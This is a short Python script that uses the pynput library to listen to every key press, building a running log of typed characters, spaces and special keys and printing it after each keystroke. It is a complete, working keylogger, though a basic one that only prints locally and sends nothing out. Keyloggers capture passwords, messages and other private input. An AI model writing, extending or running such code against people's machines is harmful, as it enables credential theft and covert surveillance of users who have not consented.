import pynput.keyboard

log = ""

def process_key_press(key):
    global log
    try:
        log += key.char 
        print(log)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

keyboard_listner = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listner:
    keyboard_listner.join()